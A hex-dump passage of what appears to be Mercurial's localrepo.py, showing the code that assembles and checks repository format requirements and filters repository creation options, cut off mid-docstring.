+00021250: 454d 454e 5429 0a20 2020 2020 2020 2072  EMENT).        r
+00021260: 6571 7569 7265 6d65 6e74 732e 6164 6428  equirements.add(
+00021270: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
+00021280: 5245 564c 4f47 5632 5f52 4551 5549 5245  REVLOGV2_REQUIRE
+00021290: 4d45 4e54 290a 2020 2020 2320 6578 7065  MENT).    # expe
+000212a0: 7269 6d65 6e74 616c 2063 6f6e 6669 673a  rimental config:
+000212b0: 2066 6f72 6d61 742e 696e 7465 726e 616c   format.internal
+000212c0: 2d70 6861 7365 0a20 2020 2069 6620 7569  -phase.    if ui
+000212d0: 2e63 6f6e 6669 6762 6f6f 6c28 6227 666f  .configbool(b'fo
+000212e0: 726d 6174 272c 2062 2775 7365 2d69 6e74  rmat', b'use-int
+000212f0: 6572 6e61 6c2d 7068 6173 6527 293a 0a20  ernal-phase'):. 
+00021300: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
+00021310: 6e74 732e 6164 6428 7265 7175 6972 656d  nts.add(requirem
+00021320: 656e 7473 6d6f 642e 494e 5445 524e 414c  entsmod.INTERNAL
+00021330: 5f50 4841 5345 5f52 4551 5549 5245 4d45  _PHASE_REQUIREME
+00021340: 4e54 290a 0a20 2020 2023 2065 7870 6572  NT)..    # exper
+00021350: 696d 656e 7461 6c20 636f 6e66 6967 3a20  imental config: 
+00021360: 666f 726d 6174 2e65 7870 2d61 7263 6869  format.exp-archi
+00021370: 7665 642d 7068 6173 650a 2020 2020 6966  ved-phase.    if
+00021380: 2075 692e 636f 6e66 6967 626f 6f6c 2862   ui.configbool(b
+00021390: 2766 6f72 6d61 7427 2c20 6227 6578 702d  'format', b'exp-
+000213a0: 6172 6368 6976 6564 2d70 6861 7365 2729  archived-phase')
+000213b0: 3a0a 2020 2020 2020 2020 7265 7175 6972  :.        requir
+000213c0: 656d 656e 7473 2e61 6464 2872 6571 7569  ements.add(requi
+000213d0: 7265 6d65 6e74 736d 6f64 2e41 5243 4849  rementsmod.ARCHI
+000213e0: 5645 445f 5048 4153 455f 5245 5155 4952  VED_PHASE_REQUIR
+000213f0: 454d 454e 5429 0a0a 2020 2020 6966 2063  EMENT)..    if c
+00021400: 7265 6174 656f 7074 732e 6765 7428 6227  reateopts.get(b'
+00021410: 6e61 7272 6f77 6669 6c65 7327 293a 0a20  narrowfiles'):. 
+00021420: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
+00021430: 6e74 732e 6164 6428 7265 7175 6972 656d  nts.add(requirem
+00021440: 656e 7473 6d6f 642e 4e41 5252 4f57 5f52  entsmod.NARROW_R
+00021450: 4551 5549 5245 4d45 4e54 290a 0a20 2020  EQUIREMENT)..   
+00021460: 2069 6620 6372 6561 7465 6f70 7473 2e67   if createopts.g
+00021470: 6574 2862 276c 6673 2729 3a0a 2020 2020  et(b'lfs'):.    
+00021480: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00021490: 2e61 6464 2862 276c 6673 2729 0a0a 2020  .add(b'lfs')..  
+000214a0: 2020 6966 2075 692e 636f 6e66 6967 626f    if ui.configbo
+000214b0: 6f6c 2862 2766 6f72 6d61 7427 2c20 6227  ol(b'format', b'
+000214c0: 626f 6f6b 6d61 726b 732d 696e 2d73 746f  bookmarks-in-sto
+000214d0: 7265 2729 3a0a 2020 2020 2020 2020 7265  re'):.        re
+000214e0: 7175 6972 656d 656e 7473 2e61 6464 2872  quirements.add(r
+000214f0: 6571 7569 7265 6d65 6e74 736d 6f64 2e42  equirementsmod.B
+00021500: 4f4f 4b4d 4152 4b53 5f49 4e5f 5354 4f52  OOKMARKS_IN_STOR
+00021510: 455f 5245 5155 4952 454d 454e 5429 0a0a  E_REQUIREMENT)..
+00021520: 2020 2020 6966 2075 692e 636f 6e66 6967      if ui.config
+00021530: 626f 6f6c 2862 2766 6f72 6d61 7427 2c20  bool(b'format', 
+00021540: 6227 7573 652d 7065 7273 6973 7465 6e74  b'use-persistent
+00021550: 2d6e 6f64 656d 6170 2729 3a0a 2020 2020  -nodemap'):.    
+00021560: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00021570: 2e61 6464 2872 6571 7569 7265 6d65 6e74  .add(requirement
+00021580: 736d 6f64 2e4e 4f44 454d 4150 5f52 4551  smod.NODEMAP_REQ
+00021590: 5549 5245 4d45 4e54 290a 0a20 2020 2023  UIREMENT)..    #
+000215a0: 2069 6620 7368 6172 652d 7361 6665 2069   if share-safe i
+000215b0: 7320 656e 6162 6c65 642c 206c 6574 2773  s enabled, let's
+000215c0: 2063 7265 6174 6520 7468 6520 6e65 7720   create the new 
+000215d0: 7265 706f 7369 746f 7279 2077 6974 6820  repository with 
+000215e0: 7468 6520 6e65 770a 2020 2020 2320 7265  the new.    # re
+000215f0: 7175 6972 656d 656e 740a 2020 2020 6966  quirement.    if
+00021600: 2075 692e 636f 6e66 6967 626f 6f6c 2862   ui.configbool(b
+00021610: 2766 6f72 6d61 7427 2c20 6227 7573 652d  'format', b'use-
+00021620: 7368 6172 652d 7361 6665 2729 3a0a 2020  share-safe'):.  
+00021630: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
+00021640: 7473 2e61 6464 2872 6571 7569 7265 6d65  ts.add(requireme
+00021650: 6e74 736d 6f64 2e53 4841 5245 5341 4645  ntsmod.SHARESAFE
+00021660: 5f52 4551 5549 5245 4d45 4e54 290a 0a20  _REQUIREMENT).. 
+00021670: 2020 2023 2069 6620 7765 2061 7265 2063     # if we are c
+00021680: 7265 6174 696e 6720 6120 7368 6172 652d  reating a share-
+00021690: 7265 706f c2b9 2020 7765 2068 6176 6520  repo..  we have 
+000216a0: 746f 2068 616e 646c 6520 7265 7175 6972  to handle requir
+000216b0: 656d 656e 740a 2020 2020 2320 6469 6666  ement.    # diff
+000216c0: 6572 656e 746c 792e 0a20 2020 2023 0a20  erently..    #. 
+000216d0: 2020 2023 205b 315d 2028 692e 652e 2072     # [1] (i.e. r
+000216e0: 6575 7369 6e67 2074 6865 2073 746f 7265  eusing the store
+000216f0: 2066 726f 6d20 616e 6f74 6865 7220 7265   from another re
+00021700: 706f 7369 746f 7279 2c20 6a75 7374 2068  pository, just h
+00021710: 6176 696e 6720 610a 2020 2020 2320 776f  aving a.    # wo
+00021720: 726b 696e 6720 636f 7079 290a 2020 2020  rking copy).    
+00021730: 6966 2062 2773 6861 7265 6472 6570 6f27  if b'sharedrepo'
+00021740: 2069 6e20 6372 6561 7465 6f70 7473 3a0a   in createopts:.
+00021750: 2020 2020 2020 2020 736f 7572 6365 5f72          source_r
+00021760: 6571 7569 7265 6d65 6e74 7320 3d20 7365  equirements = se
+00021770: 7428 6372 6561 7465 6f70 7473 5b62 2773  t(createopts[b's
+00021780: 6861 7265 6472 6570 6f27 5d2e 7265 7175  haredrepo'].requ
+00021790: 6972 656d 656e 7473 290a 0a20 2020 2020  irements)..     
+000217a0: 2020 2069 6620 7265 7175 6972 656d 656e     if requiremen
+000217b0: 7473 6d6f 642e 5348 4152 4553 4146 455f  tsmod.SHARESAFE_
+000217c0: 5245 5155 4952 454d 454e 5420 6e6f 7420  REQUIREMENT not 
+000217d0: 696e 2073 6f75 7263 655f 7265 7175 6972  in source_requir
+000217e0: 656d 656e 7473 3a0a 2020 2020 2020 2020  ements:.        
+000217f0: 2020 2020 2320 7368 6172 6520 746f 2061      # share to a
+00021800: 6e20 6f6c 6420 7363 686f 6f6c 2072 6570  n old school rep
+00021810: 6f73 6974 6f72 792c 2077 6520 6861 7665  ository, we have
+00021820: 2074 6f20 636f 7079 2074 6865 0a20 2020   to copy the.   
+00021830: 2020 2020 2020 2020 2023 2072 6571 7569           # requi
+00021840: 7265 6d65 6e74 7320 616e 6420 686f 7065  rements and hope
+00021850: 2066 6f72 2074 6865 2062 6573 742e 0a20   for the best.. 
+00021860: 2020 2020 2020 2020 2020 2072 6571 7569             requi
+00021870: 7265 6d65 6e74 7320 3d20 736f 7572 6365  rements = source
+00021880: 5f72 6571 7569 7265 6d65 6e74 730a 2020  _requirements.  
+00021890: 2020 2020 2020 656c 7365 3a0a 2020 2020        else:.    
+000218a0: 2020 2020 2020 2020 2320 5765 2068 6176          # We hav
+000218b0: 6520 636f 6e74 726f 6c20 6f6e 2074 6865  e control on the
+000218c0: 2077 6f72 6b69 6e67 2063 6f70 7920 6f6e   working copy on
+000218d0: 6c79 2c20 736f 2022 636f 7079 2220 7468  ly, so "copy" th
+000218e0: 6520 6e6f 6e0a 2020 2020 2020 2020 2020  e non.          
+000218f0: 2020 2320 776f 726b 696e 6720 636f 7079    # working copy
+00021900: 2070 6172 7420 6f76 6572 2c20 6967 6e6f   part over, igno
+00021910: 7269 6e67 2070 7265 7669 6f75 7320 6c6f  ring previous lo
+00021920: 6769 632e 0a20 2020 2020 2020 2020 2020  gic..           
+00021930: 2074 6f5f 6472 6f70 203d 2073 6574 2829   to_drop = set()
+00021940: 0a20 2020 2020 2020 2020 2020 2066 6f72  .            for
+00021950: 2072 6571 2069 6e20 7265 7175 6972 656d   req in requirem
+00021960: 656e 7473 3a0a 2020 2020 2020 2020 2020  ents:.          
+00021970: 2020 2020 2020 6966 2072 6571 2069 6e20        if req in 
+00021980: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
+00021990: 574f 524b 494e 475f 4449 525f 5245 5155  WORKING_DIR_REQU
+000219a0: 4952 454d 454e 5453 3a0a 2020 2020 2020  IREMENTS:.      
+000219b0: 2020 2020 2020 2020 2020 2020 2020 636f                co
+000219c0: 6e74 696e 7565 0a20 2020 2020 2020 2020  ntinue.         
+000219d0: 2020 2020 2020 2069 6620 7265 7120 696e         if req in
+000219e0: 2073 6f75 7263 655f 7265 7175 6972 656d   source_requirem
+000219f0: 656e 7473 3a0a 2020 2020 2020 2020 2020  ents:.          
+00021a00: 2020 2020 2020 2020 2020 636f 6e74 696e            contin
+00021a10: 7565 0a20 2020 2020 2020 2020 2020 2020  ue.             
+00021a20: 2020 2074 6f5f 6472 6f70 2e61 6464 2872     to_drop.add(r
+00021a30: 6571 290a 2020 2020 2020 2020 2020 2020  eq).            
+00021a40: 7265 7175 6972 656d 656e 7473 202d 3d20  requirements -= 
+00021a50: 746f 5f64 726f 700a 2020 2020 2020 2020  to_drop.        
+00021a60: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00021a70: 207c 3d20 736f 7572 6365 5f72 6571 7569   |= source_requi
+00021a80: 7265 6d65 6e74 730a 0a20 2020 2020 2020  rements..       
+00021a90: 2069 6620 6372 6561 7465 6f70 7473 2e67   if createopts.g
+00021aa0: 6574 2862 2773 6861 7265 6472 656c 6174  et(b'sharedrelat
+00021ab0: 6976 6527 293a 0a20 2020 2020 2020 2020  ive'):.         
+00021ac0: 2020 2072 6571 7569 7265 6d65 6e74 732e     requirements.
+00021ad0: 6164 6428 7265 7175 6972 656d 656e 7473  add(requirements
+00021ae0: 6d6f 642e 5245 4c41 5449 5645 5f53 4841  mod.RELATIVE_SHA
+00021af0: 5245 445f 5245 5155 4952 454d 454e 5429  RED_REQUIREMENT)
+00021b00: 0a20 2020 2020 2020 2065 6c73 653a 0a20  .        else:. 
+00021b10: 2020 2020 2020 2020 2020 2072 6571 7569             requi
+00021b20: 7265 6d65 6e74 732e 6164 6428 7265 7175  rements.add(requ
+00021b30: 6972 656d 656e 7473 6d6f 642e 5348 4152  irementsmod.SHAR
+00021b40: 4544 5f52 4551 5549 5245 4d45 4e54 290a  ED_REQUIREMENT).
+00021b50: 0a20 2020 2069 6620 7569 2e63 6f6e 6669  .    if ui.confi
+00021b60: 6762 6f6f 6c28 6227 666f 726d 6174 272c  gbool(b'format',
+00021b70: 2062 2775 7365 2d64 6972 7374 6174 652d   b'use-dirstate-
+00021b80: 7472 6163 6b65 642d 6869 6e74 2729 3a0a  tracked-hint'):.
+00021b90: 2020 2020 2020 2020 7665 7273 696f 6e20          version 
+00021ba0: 3d20 7569 2e63 6f6e 6669 6769 6e74 2862  = ui.configint(b
+00021bb0: 2766 6f72 6d61 7427 2c20 6227 7573 652d  'format', b'use-
+00021bc0: 6469 7273 7461 7465 2d74 7261 636b 6564  dirstate-tracked
+00021bd0: 2d68 696e 742e 7665 7273 696f 6e27 290a  -hint.version').
+00021be0: 2020 2020 2020 2020 6d73 6720 3d20 5f28          msg = _(
+00021bf0: 6222 6967 6e6f 7269 6e67 2075 6e6b 6e6f  b"ignoring unkno
+00021c00: 776e 2074 7261 636b 6564 206b 6579 2076  wn tracked key v
+00021c10: 6572 7369 6f6e 3a20 2564 5c6e 2229 0a20  ersion: %d\n"). 
+00021c20: 2020 2020 2020 2068 696e 7420 3d20 5f28         hint = _(
+00021c30: 0a20 2020 2020 2020 2020 2020 2062 2273  .            b"s
+00021c40: 6565 2060 6867 2068 656c 7020 636f 6e66  ee `hg help conf
+00021c50: 6967 2e66 6f72 6d61 742e 7573 652d 6469  ig.format.use-di
+00021c60: 7273 7461 7465 2d74 7261 636b 6564 2d68  rstate-tracked-h
+00021c70: 696e 742d 7665 7273 696f 6e22 0a20 2020  int-version".   
+00021c80: 2020 2020 2029 0a20 2020 2020 2020 2069       ).        i
+00021c90: 6620 7665 7273 696f 6e20 213d 2031 3a0a  f version != 1:.
+00021ca0: 2020 2020 2020 2020 2020 2020 7569 2e77              ui.w
+00021cb0: 6172 6e28 6d73 6720 2520 7665 7273 696f  arn(msg % versio
+00021cc0: 6e2c 2068 696e 743d 6869 6e74 290a 2020  n, hint=hint).  
+00021cd0: 2020 2020 2020 656c 7365 3a0a 2020 2020        else:.    
+00021ce0: 2020 2020 2020 2020 7265 7175 6972 656d          requirem
+00021cf0: 656e 7473 2e61 6464 2872 6571 7569 7265  ents.add(require
+00021d00: 6d65 6e74 736d 6f64 2e44 4952 5354 4154  mentsmod.DIRSTAT
+00021d10: 455f 5452 4143 4b45 445f 4849 4e54 5f56  E_TRACKED_HINT_V
+00021d20: 3129 0a0a 2020 2020 7265 7475 726e 2072  1)..    return r
+00021d30: 6571 7569 7265 6d65 6e74 730a 0a0a 6465  equirements...de
+00021d40: 6620 6368 6563 6b72 6571 7569 7265 6d65  f checkrequireme
+00021d50: 6e74 7363 6f6d 7061 7428 7569 2c20 7265  ntscompat(ui, re
+00021d60: 7175 6972 656d 656e 7473 293a 0a20 2020  quirements):.   
+00021d70: 2022 2222 4368 6563 6b73 2063 6f6d 7061   """Checks compa
+00021d80: 7469 6269 6c69 7479 206f 6620 7265 706f  tibility of repo
+00021d90: 7369 746f 7279 2072 6571 7569 7265 6d65  sitory requireme
+00021da0: 6e74 7320 656e 6162 6c65 6420 616e 6420  nts enabled and 
+00021db0: 6469 7361 626c 6564 2e0a 0a20 2020 2052  disabled...    R
+00021dc0: 6574 7572 6e73 2061 2073 6574 206f 6620  eturns a set of 
+00021dd0: 7265 7175 6972 656d 656e 7473 2077 6869  requirements whi
+00021de0: 6368 206e 6565 6473 2074 6f20 6265 2064  ch needs to be d
+00021df0: 726f 7070 6564 2062 6563 6175 7365 2064  ropped because d
+00021e00: 6570 656e 6465 6e64 0a20 2020 2072 6571  ependend.    req
+00021e10: 7569 7265 6d65 6e74 7320 6172 6520 6e6f  uirements are no
+00021e20: 7420 656e 6162 6c65 642e 2041 6c73 6f20  t enabled. Also 
+00021e30: 7761 726e 7320 7573 6572 7320 6162 6f75  warns users abou
+00021e40: 7420 6974 2222 220a 0a20 2020 2064 726f  t it"""..    dro
+00021e50: 7070 6564 203d 2073 6574 2829 0a0a 2020  pped = set()..  
+00021e60: 2020 6966 2072 6571 7569 7265 6d65 6e74    if requirement
+00021e70: 736d 6f64 2e53 544f 5245 5f52 4551 5549  smod.STORE_REQUI
+00021e80: 5245 4d45 4e54 206e 6f74 2069 6e20 7265  REMENT not in re
+00021e90: 7175 6972 656d 656e 7473 3a0a 2020 2020  quirements:.    
+00021ea0: 2020 2020 6966 2072 6571 7569 7265 6d65      if requireme
+00021eb0: 6e74 736d 6f64 2e42 4f4f 4b4d 4152 4b53  ntsmod.BOOKMARKS
+00021ec0: 5f49 4e5f 5354 4f52 455f 5245 5155 4952  _IN_STORE_REQUIR
+00021ed0: 454d 454e 5420 696e 2072 6571 7569 7265  EMENT in require
+00021ee0: 6d65 6e74 733a 0a20 2020 2020 2020 2020  ments:.         
+00021ef0: 2020 2075 692e 7761 726e 280a 2020 2020     ui.warn(.    
+00021f00: 2020 2020 2020 2020 2020 2020 5f28 0a20              _(. 
+00021f10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00021f20: 2020 2062 2769 676e 6f72 696e 6720 656e     b'ignoring en
+00021f30: 6162 6c65 6420 5c27 666f 726d 6174 2e62  abled \'format.b
+00021f40: 6f6f 6b6d 6172 6b73 2d69 6e2d 7374 6f72  ookmarks-in-stor
+00021f50: 655c 2720 636f 6e66 6967 2027 0a20 2020  e\' config '.   
+00021f60: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00021f70: 2062 2762 6561 6375 7365 2069 7420 6973   b'beacuse it is
+00021f80: 2069 6e63 6f6d 7061 7469 626c 6520 7769   incompatible wi
+00021f90: 7468 2064 6973 6162 6c65 6420 270a 2020  th disabled '.  
+00021fa0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00021fb0: 2020 6227 5c27 666f 726d 6174 2e75 7365    b'\'format.use
+00021fc0: 7374 6f72 655c 2720 636f 6e66 6967 5c6e  store\' config\n
+00021fd0: 270a 2020 2020 2020 2020 2020 2020 2020  '.              
+00021fe0: 2020 290a 2020 2020 2020 2020 2020 2020    ).            
+00021ff0: 290a 2020 2020 2020 2020 2020 2020 6472  ).            dr
+00022000: 6f70 7065 642e 6164 6428 7265 7175 6972  opped.add(requir
+00022010: 656d 656e 7473 6d6f 642e 424f 4f4b 4d41  ementsmod.BOOKMA
+00022020: 524b 535f 494e 5f53 544f 5245 5f52 4551  RKS_IN_STORE_REQ
+00022030: 5549 5245 4d45 4e54 290a 0a20 2020 2020  UIREMENT)..     
+00022040: 2020 2069 6620 280a 2020 2020 2020 2020     if (.        
+00022050: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00022060: 6d6f 642e 5348 4152 4544 5f52 4551 5549  mod.SHARED_REQUI
+00022070: 5245 4d45 4e54 2069 6e20 7265 7175 6972  REMENT in requir
+00022080: 656d 656e 7473 0a20 2020 2020 2020 2020  ements.         
+00022090: 2020 206f 7220 7265 7175 6972 656d 656e     or requiremen
+000220a0: 7473 6d6f 642e 5245 4c41 5449 5645 5f53  tsmod.RELATIVE_S
+000220b0: 4841 5245 445f 5245 5155 4952 454d 454e  HARED_REQUIREMEN
+000220c0: 5420 696e 2072 6571 7569 7265 6d65 6e74  T in requirement
+000220d0: 730a 2020 2020 2020 2020 293a 0a20 2020  s.        ):.   
+000220e0: 2020 2020 2020 2020 2072 6169 7365 2065           raise e
+000220f0: 7272 6f72 2e41 626f 7274 280a 2020 2020  rror.Abort(.    
+00022100: 2020 2020 2020 2020 2020 2020 5f28 0a20              _(. 
+00022110: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00022120: 2020 2062 2263 616e 6e6f 7420 6372 6561     b"cannot crea
+00022130: 7465 2073 6861 7265 6420 7265 706f 7369  te shared reposi
+00022140: 746f 7279 2061 7320 736f 7572 6365 2077  tory as source w
+00022150: 6173 2063 7265 6174 6564 220a 2020 2020  as created".    
+00022160: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00022170: 6222 2077 6974 6820 2766 6f72 6d61 742e  b" with 'format.
+00022180: 7573 6573 746f 7265 2720 636f 6e66 6967  usestore' config
+00022190: 2064 6973 6162 6c65 6422 0a20 2020 2020   disabled".     
+000221a0: 2020 2020 2020 2020 2020 2029 0a20 2020             ).   
+000221b0: 2020 2020 2020 2020 2029 0a0a 2020 2020           )..    
+000221c0: 2020 2020 6966 2072 6571 7569 7265 6d65      if requireme
+000221d0: 6e74 736d 6f64 2e53 4841 5245 5341 4645  ntsmod.SHARESAFE
+000221e0: 5f52 4551 5549 5245 4d45 4e54 2069 6e20  _REQUIREMENT in 
+000221f0: 7265 7175 6972 656d 656e 7473 3a0a 2020  requirements:.  
+00022200: 2020 2020 2020 2020 2020 6966 2075 692e            if ui.
+00022210: 6861 7363 6f6e 6669 6728 6227 666f 726d  hasconfig(b'form
+00022220: 6174 272c 2062 2775 7365 2d73 6861 7265  at', b'use-share
+00022230: 2d73 6166 6527 293a 0a20 2020 2020 2020  -safe'):.       
+00022240: 2020 2020 2020 2020 206d 7367 203d 205f           msg = _
+00022250: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
+00022260: 2020 2020 2020 6222 6967 6e6f 7269 6e67        b"ignoring
+00022270: 2065 6e61 626c 6564 2027 666f 726d 6174   enabled 'format
+00022280: 2e75 7365 2d73 6861 7265 2d73 6166 6527  .use-share-safe'
+00022290: 2063 6f6e 6669 6720 6265 6361 7573 6520   config because 
+000222a0: 220a 2020 2020 2020 2020 2020 2020 2020  ".              
+000222b0: 2020 2020 2020 6222 6974 2069 7320 696e        b"it is in
+000222c0: 636f 6d70 6174 6962 6c65 2077 6974 6820  compatible with 
+000222d0: 6469 7361 626c 6564 2027 666f 726d 6174  disabled 'format
+000222e0: 2e75 7365 7374 6f72 6527 220a 2020 2020  .usestore'".    
+000222f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00022300: 6222 2063 6f6e 6669 675c 6e22 0a20 2020  b" config\n".   
+00022310: 2020 2020 2020 2020 2020 2020 2029 0a20               ). 
+00022320: 2020 2020 2020 2020 2020 2020 2020 2075                 u
+00022330: 692e 7761 726e 286d 7367 290a 2020 2020  i.warn(msg).    
+00022340: 2020 2020 2020 2020 6472 6f70 7065 642e          dropped.
+00022350: 6164 6428 7265 7175 6972 656d 656e 7473  add(requirements
+00022360: 6d6f 642e 5348 4152 4553 4146 455f 5245  mod.SHARESAFE_RE
+00022370: 5155 4952 454d 454e 5429 0a0a 2020 2020  QUIREMENT)..    
+00022380: 7265 7475 726e 2064 726f 7070 6564 0a0a  return dropped..
+00022390: 0a64 6566 2066 696c 7465 726b 6e6f 776e  .def filterknown
+000223a0: 6372 6561 7465 6f70 7473 2875 692c 2063  createopts(ui, c
+000223b0: 7265 6174 656f 7074 7329 3a0a 2020 2020  reateopts):.    
+000223c0: 2222 2246 696c 7465 7273 2061 2064 6963  """Filters a dic
+000223d0: 7420 6f66 2072 6570 6f20 6372 6561 7469  t of repo creati
+000223e0: 6f6e 206f 7074 696f 6e73 2061 6761 696e  on options again
+000223f0: 7374 206f 7074 696f 6e73 2074 6861 7420  st options that 
+00022400: 6172 6520 6b6e 6f77 6e2e 0a0a 2020 2020  are known...    
+00022410: 5265 6365 6976 6573 2061 2064 6963 7420  Receives a dict 
+00022420: 6f66 2072 6570 6f20 6372 6561 7469 6f6e  of repo creation
+00022430: 206f 7074 696f 6e73 2061 6e64 2072 6574   options and ret
+00022440: 7572 6e73 2061 2064 6963 7420 6f66 2074  urns a dict of t
+00022450: 686f 7365 0a20 2020 206f 7074 696f 6e73  hose.    options
+00022460: 2074 6861 7420 7765 2064 6f6e 2774 206b   that we don't k
+00022470: 6e6f 7720 686f 7720 746f 2068 616e 646c  now how to handl
+00022480: 652e 0a0a 2020 2020 5468 6973 2066 756e  e...    This fun
+00022490: 6374 696f 6e20 6973 2063 616c 6c65 6420  ction is called 
+000224a0: 6173 2070 6172 7420 6f66 2072 6570 6f73  as part of repos
+000224b0: 6974 6f72 7920 6372 6561 7469 6f6e 2e20  itory creation. 
+000224c0: 4966 2074 6865 0a20 2020 2072 6574 7572  If the.    retur
+000224d0: 6e65 6420 6469 6374 2063 6f6e 7461 696e  ned dict contain
+000224e0: 7320 616e 7920 6974 656d 732c 2072 6570  s any items, rep
+000224f0: 6f73 6974 6f72 7920 6372 6561 7469 6f6e  ository creation
+00022500: 2077 696c 6c20 6e6f 740a 2020 2020 6265   will not.    be
+00022510: 2061 6c6c 6f77 6564 2c20 6173 2069 7420   allowed, as it 
+00022520: 6d65 616e 7320 7468 6572 6520 7761 7320  means there was 
+00022530: 6120 7265 7175 6573 7420 746f 2063 7265  a request to cre
+00022540: 6174 6520 6120 7265 706f 7369 746f 7279  ate a repository
+00022550: 0a20 2020 2077 6974 6820 6f70 7469 6f6e  .    with option
+00022560: 7320 6e6f 7420 7265 636f 676e 697a 6564  s not recognized
+00022570: 2062 7920 6c6f 6164 6564 2063 6f64 652e   by loaded code.
+00022580: 0a0a 2020 2020 4578 7465 6e73 696f 6e73  ..    Extensions
+00022590: 2063 616e 2077 7261 7020 7468 6973 2066   can wrap this f
+000225a0: 756e 6374 696f 6e20 746f 2066 696c 7465  unction to filte
+000225b0: 7220 6f75 7420 6372 6561 7469 6f6e 206f  r out creation o
+000225c0: 7074 696f 6e73 0a20 2020 2074 6865 7920  ptions.    they 
+000225d0: 6b6e 6f77 2068 6f77 2074 6f20 6861 6e64  know how to hand
+000225e0: 6c65 2e0a 2020 2020 2222 220a 2020 2020  le..    """.    
+000225f0: 6b6e 6f77 6e20 3d20 7b0a 2020 2020 2020  known = {.      
+00022600: 2020 6227 6261 636b 656e 6427 2c0a 2020    b'backend',.  
+00022610: 2020 2020 2020 6227 6c66 7327 2c0a 2020        b'lfs',.  
+00022620: 2020 2020 2020 6227 6e61 7272 6f77 6669        b'narrowfi
+00022630: 6c65 7327 2c0a 2020 2020 2020 2020 6227  les',.        b'
+00022640: 7368 6172 6564 7265 706f 272c 0a20 2020  sharedrepo',.   
+00022650: 2020 2020 2062 2773 6861 7265 6472 656c       b'sharedrel
+00022660: 6174 6976 6527 2c0a 2020 2020 2020 2020  ative',.        
+00022670: 6227 7368 6172 6564 6974 656d 7327 2c0a  b'shareditems',.
+00022680: 2020 2020 2020 2020 6227 7368 616c 6c6f          b'shallo
+00022690: 7766 696c 6573 746f 7265 272c 0a20 2020  wfilestore',.   
+000226a0: 207d 0a0a 2020 2020 7265 7475 726e 207b   }..    return {
+000226b0: 6b3a 2076 2066 6f72 206b 2c20 7620 696e  k: v for k, v in
+000226c0: 2063 7265 6174 656f 7074 732e 6974 656d   createopts.item
+000226d0: 7328 2920 6966 206b 206e 6f74 2069 6e20  s() if k not in 
+000226e0: 6b6e 6f77 6e7d 0a0a 0a64 6566 2063 7265  known}...def cre
+000226f0: 6174 6572 6570 6f73 6974 6f72 7928 7569  aterepository(ui
+00022700: 2c20 7061 7468 3a20 6279 7465 732c 2063  , path: bytes, c
+00022710: 7265 6174 656f 7074 733d 4e6f 6e65 2c20  reateopts=None, 
+00022720: 7265 7175 6972 656d 656e 7473 3d4e 6f6e  requirements=Non
+00022730: 6529 3a0a 2020 2020 2222 2243 7265 6174  e):.    """Creat
+00022740: 6520 6120 6e65 7720 7265 706f 7369 746f  e a new reposito
+00022750: 7279 2069 6e20 6120 7666 732e 0a0a 2020  ry in a vfs...  
+00022760: 2020 6060 7061 7468 6060 2070 6174 6820    ``path`` path 
+00022770: 746f 2074 6865 206e 6577 2072 6570 6f27  to the new repo'
+00022780: 7320 776f 726b 696e 6720 6469 7265 6374  s working direct
+00022790: 6f72 792e 0a20 2020 2060 6063 7265 6174  ory..    ``creat
+000227a0: 656f 7074 7360 6020 6f70 7469 6f6e 7320  eopts`` options 
+000227b0: 666f 7220 7468 6520 6e65 7720 7265 706f  for the new repo
+000227c0: 7369 746f 7279 2e0a 2020 2020 6060 7265  sitory..    ``re
+000227d0: 7175 6972 656d 656e 7460 6020 7072 6564  quirement`` pred
+000227e0: 6566 696e 6564 2073 6574 206f 6620 7265  efined set of re
+000227f0: 7175 6972 656d 656e 7473 2e0a 2020 2020  quirements..    
+00022800: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00022810: 2869 6e63 6f6d 7061 7469 626c 6520 7769  (incompatible wi
+00022820: 7468 2060 6063 7265 6174 656f 7074 7360  th ``createopts`
+00022830: 6029 0a0a 2020 2020 5468 6520 666f 6c6c  `)..    The foll
+00022840: 6f77 696e 6720 6b65 7973 2066 6f72 2060  owing keys for `
+00022850: 6063 7265 6174 656f 7074 7360 6020 6172  `createopts`` ar
+00022860: 6520 7265 636f 676e 697a 6564 3a0a 0a20  e recognized:.. 
+00022870: 2020 2062 6163 6b65 6e64 0a20 2020 2020     backend.     
+00022880: 2020 5468 6520 7374 6f72 6167 6520 6261    The storage ba
+00022890: 636b 656e 6420 746f 2075 7365 2e0a 2020  ckend to use..  
+000228a0: 2020 6c66 730a 2020 2020 2020 2052 6570    lfs.       Rep
+000228b0: 6f73 6974 6f72 7920 7769 6c6c 2062 6520  ository will be 
+000228c0: 6372 6561 7465 6420 7769 7468 2060 606c  created with ``l
+000228d0: 6673 6060 2072 6571 7569 7265 6d65 6e74  fs`` requirement
+000228e0: 2e20 5468 6520 6c66 7320 6578 7465 6e73  . The lfs extens
+000228f0: 696f 6e0a 2020 2020 2020 2077 696c 6c20  ion.       will 
+00022900: 6175 746f 6d61 7469 6361 6c6c 7920 6265  automatically be
+00022910: 206c 6f61 6465 6420 7768 656e 2074 6865   loaded when the
+00022920: 2072 6570 6f73 6974 6f72 7920 6973 2061   repository is a
+00022930: 6363 6573 7365 642e 0a20 2020 206e 6172  ccessed..    nar
+00022940: 726f 7766 696c 6573 0a20 2020 2020 2020  rowfiles.       
+00022950: 5365 7420 7570 2072 6570 6f73 6974 6f72  Set up repositor
+00022960: 7920 746f 2073 7570 706f 7274 206e 6172  y to support nar
+00022970: 726f 7720 6669 6c65 2073 746f 7261 6765  row file storage
+00022980: 2e0a 2020 2020 7368 6172 6564 7265 706f  ..    sharedrepo
+00022990: 0a20 2020 2020 2020 5265 706f 7369 746f  .       Reposito
+000229a0: 7279 206f 626a 6563 7420 6672 6f6d 2077  ry object from w
